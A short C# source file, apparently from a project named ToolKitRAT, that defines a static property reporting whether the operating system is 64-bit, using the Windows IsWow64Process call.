using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace ToolKitRAT.WinApi {
    public static class Properties {

      
        public static bool Is64BitOperatingSystem =>
#if WIN32
                Kernel32.IsWow64Process(Kernel32.GetCurrentProcess(), out bool isWow64) && isWow64;
#else
                true;
#endif
    }
}
